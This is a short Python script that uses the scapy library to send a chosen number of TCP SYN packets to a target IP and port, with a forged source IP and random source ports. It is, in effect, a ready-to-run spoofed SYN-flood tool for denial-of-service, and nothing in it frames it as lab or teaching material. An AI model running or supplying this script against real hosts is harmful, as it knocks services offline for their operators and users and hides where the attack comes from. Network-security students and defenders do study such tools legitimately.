# Use Python3 to run
#!/usr/bin/python
import sys, socket
from scapy.all import *

if len(sys.argv) != 5:
    # print("Usage>>>:%s  source_IP  dest_IP  dest_port  how_many_packets" % sys.argv[0])
    print(f"Usage>>>:{sys.argv[0]}  source_IP  dest_IP  dest_port  how_many_packets")
    sys.exit(1)
srcIP = sys.argv[1]
destIP = sys.argv[2]
destPort = int(sys.argv[3])
count = int(sys.argv[4])
for i in range(count):
    IP_header = IP(src=srcIP, dst=destIP)
    TCP_header = TCP(flags="S", sport=RandShort(), dport=destPort)
    packet = IP_header / TCP_header
    try:
        send(packet)
    except Exception as e:
        print(e)
